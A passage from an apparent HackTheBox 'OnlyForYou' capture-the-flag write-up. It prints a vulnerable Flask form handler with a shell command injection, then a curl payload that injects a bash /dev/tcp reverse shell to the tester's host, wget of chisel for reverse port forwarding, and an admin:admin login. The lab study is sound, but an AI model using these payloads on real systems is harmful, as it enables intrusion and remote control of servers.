+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bad_request</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;400.html&#39;</span><span class="p">),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.errorhandler</span><span class="p">(</span><span class="mi">405</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">method_not_allowed</span><span class="p">(</span><span class="n">error</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;405.html&#39;</span><span class="p">),</span> <span class="mi">405</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We don&rsquo;t see much here, but take a look at the imports associated. <code>flask</code> is a standard python module for web servers, and <code>uuid</code> is also commonly within the library. However, <code>form</code> is very generic and does not exist in the pip library. This is likely coming from another python file somewhere. Since non-library imports follow current working directory schema, we know that <code>form.py</code> will also exist in this same folder. If, perhaps, it existed in <code>tools/form.py</code>, we would see the import line reflect this: <code>from tools.form import sendmessage</code>.</p>
+<p>Viewing form.py:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://beta.only4you.htb/download -d &#34;image=/var/www/only4you.htb/form.py&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Full code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">smtplib</span><span class="o">,</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">email.message</span> <span class="kn">import</span> <span class="n">EmailMessage</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">PIPE</span><span class="p">,</span> <span class="n">run</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ipaddress</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">issecure</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="s2">&#34;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})&#34;</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">domain</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="s2">&#34;v=spf1&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">domains</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">ips</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="s2">&#34;include:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">dms</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;include:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">dms</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">dms</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                        <span class="n">domains</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">domains</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                <span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                <span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">if</span> <span class="s2">&#34;include:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">dms</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;include:.*\.[A-Z|a-z]{2,}&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;include:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">domains</span><span class="o">.</span><span class="n">clear</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="k">for</span> <span class="n">domain</span> <span class="ow">in</span> <span class="n">dms</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                                <span class="n">domains</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">elif</span> <span class="s2">&#34;ip4:&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">ipaddresses</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span class="si">{2}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;ip4:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="n">ipaddresses</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ipaddresses</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                                <span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                                <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                                        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">elif</span> <span class="s2">&#34;ip4&#34;</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">ipaddresses</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]</span><span class="si">{2}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">output</span><span class="p">))</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;ip4:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">ipaddresses</span><span class="o">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ipaddresses</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                        <span class="n">ips</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ips</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">ip</span> <span class="o">==</span> <span class="n">i</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">elif</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_address</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span> <span class="ow">in</span> <span class="n">ipaddress</span><span class="o">.</span><span class="n">ip_network</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                                <span class="k">return</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sendmessage</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">subject</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">ip</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="n">issecure</span><span class="p">(</span><span class="n">email</span><span class="p">,</span> <span class="n">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span> <span class="o">=</span> <span class="n">EmailMessage</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;From&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">email</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;To&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;info@only4you.htb&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;Subject&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">subject</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">msg</span><span class="p">[</span><span class="s1">&#39;Message&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">25</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">smtp</span><span class="o">.</span><span class="n">send_message</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">status</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">status</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold">Foothold</h2>
+<h3 id="command-injection-vulnerability-in-message-form">Command Injection vulnerability in message form</h3>
+<p>Within <code>issecure</code>, the re.match follows a rather complex regex. To get a more thorough understanding as to what is passing or failing, the simplest approach is to use a <a class="link" href="https://regex101.com/"  target="_blank" rel="noopener"
+    >regex matcher</a></p>
+<p><img src="/post/hackthebox-onlyforyou/Images/regex1.png"
+	width="645"
+	height="138"
+	srcset="/post/hackthebox-onlyforyou/Images/regex1_hu6e790c9f87afe83e318dbc3e2cf48dcd_14196_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/regex1_hu6e790c9f87afe83e318dbc3e2cf48dcd_14196_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="467"
+		data-flex-basis="1121px"
+	
+>
+We can see we need a string of letters or numbers (one <code>.- or _</code> allowed), followed by a <code>@</code>, another string of letters or numbers, followed by a <code>.</code>, then at least 2 more letters to pass. The next interesting component is the operations <code>domain</code> and <code>result</code>. Our query is split by the <code>@</code> symbol, and the second field is run through a dig:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">domain</span> <span class="o">=</span> <span class="n">email</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;@&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="n">run</span><span class="p">([</span><span class="sa">f</span><span class="s2">&#34;dig txt </span><span class="si">{</span><span class="n">domain</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Since the regex is  not performing any filtering, we can add whatever we want following our valid <code>asdf@asf.com</code>, and this will enter the dig command. Using this, we can abuse command injections:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://only4you.htb/ -d &#34;email=asdf@asdf.com;%20curl%2010.10.14.139&amp;subject=&amp;message=&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 80                    
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 42580
+</span></span><span class="line"><span class="cl">GET / HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 10.10.14.139
+</span></span><span class="line"><span class="cl">User-Agent: curl/7.68.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can use this to spawn a reverse shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.139/8888 0&gt;&amp;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://only4you.htb/ -d &#34;email=asdf@asdf.com;%3b+bash+-c+&#39;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.14.139/8888+0&gt;%261&#39;&amp;subject=&amp;message=&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On listener:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.139] from (UNKNOWN) [10.10.11.210] 54938
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="enumerating-the-system-as-www-data">Enumerating the system as www-data</h3>
+<p>Running netstat, we find unusual ports open:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@only4you:/$ netstat -ano
+</span></span><span class="line"><span class="cl">Active Internet connections (servers and established)
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span><span class="line"><span class="cl">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>These ports can be viewed internally via chisel. Placing chisel on the box:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@only4you:/tmp$ wget 10.10.14.139/chisel
+</span></span><span class="line"><span class="cl">--2023-Apr-23 15:11:50--  http://10.10.14.139/chisel
+</span></span><span class="line"><span class="cl">Connecting to 10.10.14.139:80... connected.
+</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
+</span></span><span class="line"><span class="cl">Length: 8654848 (8.3M) [application/octet-stream]
+</span></span><span class="line"><span class="cl">Saving to: ‘chisel’
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chisel              100%[===================&gt;]   8.25M  1.28MB/s    in 7.4s    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2023-04-23 15:11:58 (1.12 MB/s) - ‘chisel’ saved [8654848/8654848]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@only4you:/tmp$
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Setting up chisel
+on kali:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ./chisel server -p 8000 --reverse
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On only4you:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@only4you:/tmp$ chmod +x chisel
+</span></span><span class="line"><span class="cl">www-data@only4you:/tmp$ ./chisel client 10.10.14.139:8000 R:3000:127.0.0.1:3000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can visit <code>localhost:3000</code> in our browser, and view the page on <code>only4you</code> listening at port 3000:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/InternalGogs25.png"
+	width="1264"
+	height="499"
+	srcset="/post/hackthebox-onlyforyou/Images/InternalGogs25_hu4573cc91c07669d4f27a2b127102d9eb_55017_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/InternalGogs25_hu4573cc91c07669d4f27a2b127102d9eb_55017_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p>We can see an internal git service. There is another interesting port at 8001, but for now let&rsquo;s take a look at this page</p>
+<p>We see two users viewable, john and administrator:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/users.png"
+	width="974"
+	height="264"
+	srcset="/post/hackthebox-onlyforyou/Images/users_hub185f5dcb07c54819546c6865119eb66_23039_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/users_hub185f5dcb07c54819546c6865119eb66_23039_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="368"
+		data-flex-basis="885px"
+	
+></p>
+<p>There are no repositories veiwable unfortunately, so it might be best to return to this after credentials are acquired.</p>
+<p>To view the 8001 page, we must resubmit a new chisel client:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@only4you:/tmp$ ./chisel client 10.10.14.139:8000 R:8001:127.0.0.1:8001
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see yet another login frontpage:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/AnotherLogin.png"
+	width="1496"
+	height="591"
+	srcset="/post/hackthebox-onlyforyou/Images/AnotherLogin_huc9ff6273725b3e8cdba229c15a935fb6_221711_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/AnotherLogin_huc9ff6273725b3e8cdba229c15a935fb6_221711_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p>Fortunately though, this one is different. We can get in with the very simple credentials, <code>admin:admin</code> !</p>
+<p>Viewing the dashboard, there is interesting information in the task checklist of the corner:</p>
+<p><img src="/post/hackthebox-onlyforyou/Images/Tasklist.png"
+	width="779"
+	height="374"
+	srcset="/post/hackthebox-onlyforyou/Images/Tasklist_huf727b32026a4635e2787ea406e6b4f4f_25754_480x0_resize_box_3.png 480w, /post/hackthebox-onlyforyou/Images/Tasklist_huf727b32026a4635e2787ea406e6b4f4f_25754_1024x0_resize_box_3.png 1024w"
